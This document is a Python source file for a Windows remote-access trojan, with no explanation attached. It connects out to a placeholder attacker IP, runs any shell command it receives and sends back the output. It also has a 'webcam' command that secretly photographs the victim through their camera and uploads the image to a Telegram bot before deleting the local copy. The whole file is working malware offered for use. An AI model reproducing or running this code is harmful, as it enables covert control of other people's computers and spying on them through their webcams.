import os
import socket
import subprocess
from cv2 import VideoCapture, CAP_DSHOW, imwrite, destroyAllWindows
from requests import post

bot_token = "Telegram Bot Token"
chat_id = "Telegram ID"
HOST = 'attaker IP'
PORT = 9999
s = socket.socket()


def web_cam():
    try:
        camera_port = 0
        cap = VideoCapture(camera_port, CAP_DSHOW)
        for i in range(int(0.1)):
            cap.read()
        ret, frame = cap.read()
        imwrite(r"C:\Windows\Temp\screen.png", frame)
        cap.release()
        destroyAllWindows()
        photo = open(r"C:\Windows\Temp\screen.png", 'rb')
        files = {'document': photo}
        post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=files)
        photo.close()
        os.system(r"del C:\Windows\Temp\screen.png")
    except Exception as ex:
        s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))


def main():
    s.connect((HOST, PORT))

    while True:
        data = s.recv(1024)
        cmd = str(data, encoding="utf-8", errors="ignore")

        if cmd == 'quit':
            s.close()
            exit(0)

        elif cmd[:2] == "cd":
            try:
                os.chdir(data[3:])
                pwd = os.getcwd()
                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        elif cmd == "webcam":
            try:
                web_cam()
                pwd = os.getcwd()
                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        elif cmd == "pwd":
            try:
                pwd = os.getcwd()
                s.send(bytes(pwd, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        elif len(cmd) > 0:
            try:
                command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                    stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = command.stdout.read() + command.stderr.read()
                output_str = str(output_byte, "utf-8", errors="ignore")
                s.send(bytes(output_str, encoding="utf-8", errors="ignore"))
            except Exception as ex:
                s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))

        elif cmd == "":
            s.send(bytes("Error:\n", encoding="utf-8", errors="ignore"))


if __name__ == '__main__':
    main()
